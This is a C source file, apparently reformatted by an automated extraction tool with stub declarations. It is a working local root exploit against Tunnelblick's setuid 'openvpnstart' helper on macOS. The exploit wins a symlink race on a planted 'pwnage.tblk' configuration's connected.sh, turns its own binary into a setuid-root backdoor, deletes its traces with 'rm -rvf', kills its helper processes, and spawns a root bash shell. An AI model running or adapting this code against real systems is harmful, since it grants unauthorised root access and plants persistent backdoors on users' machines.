#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int uint32_t ;
typedef  int /*<<< orphan*/  script ;
typedef  int pid_t ;
typedef  int /*<<< orphan*/  pid_file ;
typedef  int /*<<< orphan*/  path ;
typedef  int /*<<< orphan*/  dir ;
typedef  int /*<<< orphan*/  command ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int S_ISUID ; 
 int S_IXOTH ; 
 int /*<<< orphan*/  _NSGetExecutablePath (char*,int*) ; 
 int /*<<< orphan*/  chmod (char*,int) ; 
 int /*<<< orphan*/  chown (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  execl (char*,char*,char*,...) ; 
 int /*<<< orphan*/  fclose (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * fopen (char*,char*) ; 
 int fork () ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ *,char*,int,int) ; 
 int /*<<< orphan*/  fscanf (int /*<<< orphan*/ *,char*,int*,int*) ; 
 char* getenv (char*) ; 
 int /*<<< orphan*/  geteuid () ; 
 int getpid () ; 
 int /*<<< orphan*/  kill (int,int) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  realpath (char*,char*) ; 
 int /*<<< orphan*/  setenv (char*,char*,int) ; 
 int /*<<< orphan*/  setgid (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  setuid (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  snprintf (char*,int,char*,char*) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 int /*<<< orphan*/  symlink (char*,char*) ; 
 int /*<<< orphan*/  system (char*) ; 
 int /*<<< orphan*/  unlink (char*) ; 
 int /*<<< orphan*/  wait (int /*<<< orphan*/ *) ; 

int main(int argc, char *argv[])
{
	char dir[512];
	char script[512];
	char command[512];
	char pid_file[512];
	char path[512];
	char self[512];
	uint32_t size;
	pid_t pid, pid2;
	FILE *file;
	
	snprintf(dir, sizeof(dir), "%s/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents/Resources", getenv("HOME"));
	snprintf(pid_file, sizeof(pid_file), "%s/exploit.pid", dir);

	/* Oh god, do I miss /proc/self/exe. */
	if (getenv("PWNPATH"))
		strcpy(self, getenv("PWNPATH"));
	else {
		size = sizeof(path);
		_NSGetExecutablePath(path, &size);
		realpath(path, self);
		setenv("PWNPATH", self, 1);
	}

	if (!geteuid()) {
		file = fopen(pid_file, "r");
		if (file) {	
			printf("[+] Making backdoor.\n");
			chown(self, 0, 0);
			chmod(self, S_ISUID | S_IXOTH);

			printf("[+] Cleaning up.\n");
			fscanf(file, "%d %d", &pid, &pid2);
			fclose(file);
			snprintf(command, sizeof(command), "rm -rvf '%s/../../../'", dir);
			system(command);
		
			printf("[+] Complete. Run this again to get root.\n");
			kill(pid2, 9);
			kill(pid, 9);
			return 0;
		}
		printf("[+] Getting root.\n");
		setuid(0);
		setgid(0);
		execl("/bin/bash", "bash", NULL);
	}


	printf("[+] Creating vulnerable directory.\n");
	snprintf(command, sizeof(command), "mkdir -p -v '%s'", dir);
	system(command);

	pid = fork();
	if (!pid) {
		printf("[+] Running toggler.\n");
		snprintf(script, sizeof(script), "%s/connected.sh", dir);
		for (;;) {
			unlink(script);
			symlink("/Applications/Tunnelblick.app/Contents/Resources/client.down.tunnelblick.sh", script);
			unlink(script);
			symlink(self, script);
		}
	} else {
		printf("[+] Writing pid and executing vulnerable program.\n");
		file = fopen(pid_file, "w");
		fprintf(file, "%d %d", pid, getpid());
		fclose(file);
		for (;;) {
			if (fork())
				wait(NULL);
			else {
				close(0);
				close(2);
				execl("/Applications/Tunnelblick.app/Contents/Resources/openvpnstart", "openvpnstart", "connected", "pwnage.tblk", "0", NULL);
			}
		}
	}

	return 0;	
}